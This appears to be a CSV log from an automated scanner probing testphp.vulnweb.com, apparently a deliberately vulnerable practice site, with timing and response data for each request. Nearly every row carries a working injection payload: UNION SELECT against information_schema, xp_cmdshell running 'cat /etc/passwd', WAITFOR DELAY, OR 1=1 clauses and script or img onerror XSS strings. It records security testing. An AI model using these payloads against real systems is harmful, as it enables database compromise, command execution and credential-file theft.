2026-01-22T15:49:09.510713,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.7113971710205078,0.5915849208831787,-0.1198122501373291,-0.16841822686117375,1343,200,,,generic
2026-01-22T15:49:54.098860,http://testphp.vulnweb.com/redir.php?r=http://mist-cccp.com/users.php?m=details&id=24157,r,boolean, AND 1=1,35.65209221839905,1.564382791519165,-34.08770942687988,-0.9561208699355986,1816,403,,,generic
2026-01-22T15:49:58.872853,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1,0.31438565254211426,0.5641946792602539,0.24980902671813965,0.7945942338595617,323,200,,,generic
2026-01-22T15:50:01.122391,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1--,0.31438565254211426,0.5104649066925049,0.19607925415039062,0.623690211575811,323,200,,,generic
2026-01-22T15:50:24.648349,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,time-based,) WAITFOR DELAY '00:00:5'--,0.5490655899047852,18.66269850730896,18.113632917404175,32.989925521548905,180,200,,,generic
2026-01-22T15:55:18.702874,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.9846992492675781,0.3092937469482422,-0.6754055023193359,-0.6859002917100875,1343,200,,,generic
2026-01-22T15:55:18.748310,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.9911437034606934,0.35695743560791016,-0.6341862678527832,-0.639852995724483,1343,200,,,generic
2026-01-22T15:55:19.193668,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1086177825927734,0.8111138343811035,-0.2975039482116699,-0.2683557425137853,1343,200,,,generic
2026-01-22T15:55:21.006499,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.9846992492675781,0.569739580154419,-0.4149596691131592,-0.42140752054173625,1343,200,,,generic
2026-01-22T15:55:21.060003,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.9911437034606934,0.46296143531799316,-0.5281822681427002,-0.5329018045501277,1343,200,,,generic
2026-01-22T15:55:21.605498,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1086177825927734,0.5702407360076904,-0.538377046585083,-0.48562909150343664,1343,200,,,generic
2026-01-22T15:55:25.526780,http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,id,boolean,""" OR 1=1--",0.8434796333312988,0.6150619983673096,-0.22841763496398926,-0.27080397194874795,319,200,,,generic
2026-01-22T15:59:16.743033,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.029526948928833,0.4164562225341797,-0.6130707263946533,-0.5954877888650901,1343,200,,,generic
2026-01-22T15:59:17.405353,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.143122673034668,0.8228714466094971,-0.3202512264251709,-0.28015473227820276,1343,200,,,generic
2026-01-22T15:59:17.421026,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1522164344787598,0.724341869354248,-0.4278745651245117,-0.37134912532129766,1343,200,,,generic
2026-01-22T15:59:19.046233,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.029526948928833,0.6145317554473877,-0.4149951934814453,-0.40309308456007426,1343,200,,,generic
2026-01-22T15:59:19.555272,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1522164344787598,0.6414992809295654,-0.5107171535491943,-0.4432475863618738,1343,200,,,generic
2026-01-22T15:59:19.683417,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.143122673034668,0.4856538772583008,-0.6574687957763672,-0.5751515662190245,1343,200,,,generic
2026-01-22T15:59:24.166905,http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,id,boolean,""" OR 1=1--",1.154468297958374,0.6588504314422607,-0.4956178665161133,-0.42930400721491574,319,200,,,generic
2026-01-22T15:59:50.379250,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.46044492721557617,0.6915960311889648,0.23115110397338867,0.502016832656223,1343,200,,,generic
2026-01-22T15:59:50.869712,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.7172026634216309,0.31696105003356934,-0.4002416133880615,-0.5580592959298124,1343,200,,,generic
2026-01-22T15:59:50.945461,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.7590138912200928,0.44069862365722656,-0.3183152675628662,-0.41938002880445796,1343,200,,,generic
2026-01-22T15:59:52.624374,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.46044492721557617,0.5845997333526611,0.12415480613708496,0.2696409468291455,1343,200,,,generic
2026-01-22T15:59:53.273453,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.7590138912200928,0.5471606254577637,-0.2118532657623291,-0.2791164538790998,1343,200,,,generic
2026-01-22T15:59:53.276010,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.7172026634216309,0.6541917324066162,-0.06301093101501465,-0.08785652121591694,1343,200,,,generic
2026-01-22T16:00:02.771956,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,fYij,boolean, AND 1=1,0.7820641994476318,0.699373722076416,-0.08269047737121582,-0.1057336180707667,1343,200,,,generic
2026-01-22T16:00:02.783752,http://testphp.vulnweb.com/index.php?id=%252%25&user=1&gqAL=9173%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,gqAL,boolean, AND 1=1--,0.6456341743469238,0.7718870639801025,0.1262528896331787,0.19554864759271282,4958,200,,,generic
2026-01-22T16:00:02.807251,http://testphp.vulnweb.com/login.php?id=1&NtFH=4809%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.6479220390319824,0.8237771987915039,0.17585515975952148,0.27141407324599587,5523,200,,,auth
2026-01-22T16:00:02.809485,http://testphp.vulnweb.com/search.php?order=order&query=query,order,boolean, AND 1=1--,0.5310719013214111,0.6781339645385742,0.14706206321716309,0.27691554166440324,4732,200,,,search
2026-01-22T16:00:02.962905,http://testphp.vulnweb.com/index.php?%25id%25=1&user=2&NuVD=7521%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,NuVD,boolean, AND 1=1--,0.4607203006744385,0.7887029647827148,0.32798266410827637,0.7118910619483223,4958,200,,,generic
2026-01-22T16:00:04.545302,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,LDeO,boolean,' OR '1'='1'--,0.8333377838134766,0.6429026126861572,-0.19043517112731934,-0.22852098491905637,170,200,,,generic
2026-01-22T16:00:04.641002,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,YVeN,boolean,' OR '1'='1'--,0.7622575759887695,0.5647797584533691,-0.1974778175354004,-0.25906966851623636,170,200,,,generic
2026-01-22T16:00:06.974070,http://testphp.vulnweb.com/redir.php?r=http://mist-cccp.com/users.php?m=details&id=24157,r,boolean,' OR '1'='1'--,2.0956335067749023,1.12044358253479,-0.9751899242401123,-0.4653437354802039,1816,403,,,generic
2026-01-22T16:00:17.564789,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1,0.2862989902496338,0.5432207584381104,0.25692176818847656,0.8973897112401891,323,200,,,generic
2026-01-22T16:00:19.899443,http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1,id,boolean, AND 1=1--,0.2862989902496338,0.617652416229248,0.33135342597961426,1.157368475839527,323,200,,,generic
2026-01-22T16:02:29.741455,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1933095455169678,1.0971055030822754,-0.09620404243469238,-0.08061951971817563,1343,200,,,generic
2026-01-22T16:02:29.789154,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.158912181854248,1.13358736038208,-0.02532482147216797,-0.02185223511211048,1343,200,,,generic
2026-01-22T16:02:29.834643,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,1.1794283390045166,1.1108431816101074,-0.06858515739440918,-0.05815118657594553,1343,200,,,generic
2026-01-22T16:02:33.011734,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&DUMM=1329%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1933095455169678,0.6846277713775635,-0.5086817741394043,-0.4262781405297753,1343,200,,,generic
2026-01-22T16:02:33.999363,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.158912181854248,0.9946773052215576,-0.16423487663269043,-0.14171468658644717,1343,200,,,generic
2026-01-22T16:02:34.538510,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,1.1794283390045166,0.9907946586608887,-0.18863368034362793,-0.15993653374722375,1343,200,,,generic
2026-01-22T16:02:44.564458,http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,id,boolean,""" OR 1=1--",0.9711825847625732,0.7030749320983887,-0.26810765266418457,-0.2760630769853944,319,200,,,generic
2026-01-22T16:03:02.165771,http://testphp.vulnweb.com/index.php?%25id%25=%28SELECT%20CONCAT%28CONCAT%28%27qqpxq%27%2C%28CASE%20WHEN%20%287911%3D7911%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qvxvq%27%29%29&user=2,user,boolean, AND 1=1--,0.6341204643249512,0.5985465049743652,-0.03557395935058594,-0.05609968665568295,4958,200,,,generic
2026-01-22T16:03:02.220022,http://testphp.vulnweb.com/index.php?id=%252%25%20AND%203613%3D3613&user=1,user,boolean,' OR 'a'='a'--,0.6828107833862305,0.5838098526000977,-0.09900093078613281,-0.14499028602794217,4958,200,,,generic
2026-01-22T16:03:02.231545,http://testphp.vulnweb.com/login.php?id=1&SlFY=4435%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,SlFY,boolean, AND 1=1--,0.5220386981964111,0.7561039924621582,0.23406529426574707,0.4483677073642588,5523,200,,,auth
2026-01-22T16:03:02.250239,http://testphp.vulnweb.com/index.php?id=%252%25&user=1&gqAL=9173%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,user,boolean,' OR 'a'='a'--,0.6030592918395996,0.5474672317504883,-0.05559206008911133,-0.09218340690768692,4958,200,,,generic
2026-01-22T16:03:02.353417,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&HlhS=7264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,HlhS,boolean,""") OR 1=1--",0.4953019618988037,0.5806810855865479,0.08537912368774414,0.17237792348011766,1343,200,,,generic
2026-01-22T16:03:03.915125,http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,mjqN,boolean,' OR 1=1--,0.6205201148986816,0.5750489234924316,-0.04547119140625,-0.07327915778149194,170,200,,,generic
2026-01-22T16:03:04.007345,http://testphp.vulnweb.com/index.php?%25id%25=1&user=2&NuVD=7521%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,user,boolean,' OR 1=1--,0.5969717502593994,0.7181956768035889,0.12122392654418945,0.20306476226306283,170,200,,,generic
2026-01-22T16:03:11.981266,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.636549711227417,0.644174337387085,0.007624626159667969,0.011978052970860522,1343,200,,,generic
2026-01-22T16:03:12.535464,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.5993821620941162,0.6215732097625732,0.02219104766845703,0.03702320334480116,1343,200,,,generic
2026-01-22T16:03:13.078761,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1,0.6246185302734375,0.49903297424316406,-0.12558555603027344,-0.20105960669353853,1343,200,,,generic
2026-01-22T16:03:14.328260,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.636549711227417,0.6363699436187744,-0.00017976760864257812,-0.00028240937898776837,1343,200,,,generic
2026-01-22T16:03:14.847501,http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,id,boolean, AND 1=1--,0.5993821620941162,0.7494874000549316,0.15010523796081543,0.2504332752185668,1343,200,,,generic
